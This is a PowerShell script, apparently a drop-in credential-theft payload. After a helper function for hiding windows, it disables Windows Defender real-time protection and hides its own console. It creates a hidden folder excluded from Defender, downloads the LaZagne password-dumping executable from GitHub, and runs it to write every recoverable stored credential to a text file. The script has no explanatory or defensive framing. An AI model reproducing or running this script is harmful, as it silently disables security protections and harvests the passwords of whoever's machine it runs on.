# Function from https://gist.github.com/lalibi/3762289efc5805f8cfcf (Hide Powershell Window)
function Set-WindowState {
    <#
    .LINK
    https://gist.github.com/Nora-Ballard/11240204
    #>

    [CmdletBinding(DefaultParameterSetName = 'InputObject')]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [Object[]] $InputObject,

        [Parameter(Position = 1)]
        [ValidateSet('FORCEMINIMIZE', 'HIDE', 'MAXIMIZE', 'MINIMIZE', 'RESTORE',
                     'SHOW', 'SHOWDEFAULT', 'SHOWMAXIMIZED', 'SHOWMINIMIZED',
                     'SHOWMINNOACTIVE', 'SHOWNA', 'SHOWNOACTIVATE', 'SHOWNORMAL')]
        [string] $State = 'SHOW',
        [switch] $SuppressErrors = $false,
        [switch] $SetForegroundWindow = $false
    )

    Begin {
        $WindowStates = @{
        'FORCEMINIMIZE'         = 11
            'HIDE'              = 0
            'MAXIMIZE'          = 3
            'MINIMIZE'          = 6
            'RESTORE'           = 9
            'SHOW'              = 5
            'SHOWDEFAULT'       = 10
            'SHOWMAXIMIZED'     = 3
            'SHOWMINIMIZED'     = 2
            'SHOWMINNOACTIVE'   = 7
            'SHOWNA'            = 8
            'SHOWNOACTIVATE'    = 4
            'SHOWNORMAL'        = 1
        }

        $Win32ShowWindowAsync = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SetForegroundWindow(IntPtr hWnd);
'@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru

        if (!$global:MainWindowHandles) {
            $global:MainWindowHandles = @{ }
        }
    }

    Process {
        foreach ($process in $InputObject) {
            $handle = $process.MainWindowHandle

            if ($handle -eq 0 -and $global:MainWindowHandles.ContainsKey($process.Id)) {
                $handle = $global:MainWindowHandles[$process.Id]
            }

            if ($handle -eq 0) {
                if (-not $SuppressErrors) {
                    Write-Error "Main Window handle is '0'"
                }
                continue
            }

            $global:MainWindowHandles[$process.Id] = $handle

            $Win32ShowWindowAsync::ShowWindowAsync($handle, $WindowStates[$State]) | Out-Null
            if ($SetForegroundWindow) {
                $Win32ShowWindowAsync::SetForegroundWindow($handle) | Out-Null
            }

            Write-Verbose ("Set Window State '{1} on '{0}'" -f $MainWindowHandle, $State)
        }
    }
}

Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'

# Disable real time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Minimize window 
Get-Process -ID $PID | Set-WindowState -State HIDE
# Create a tmp directory in the Downloads folder
$dir = "C:\tmp"
New-Item -ItemType Directory -Path $dir
# Add an exception to Windows Defender for the tmp directory
Add-MpPreference -ExclusionPath $dir
#Hide the directory
$hide = Get-Item $dir -Force
$hide.attributes='Hidden'
# Download the executable
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"
# Execute the executable and save output to a file
& "$dir\lazagne.exe" all > "$dir\output.txt"

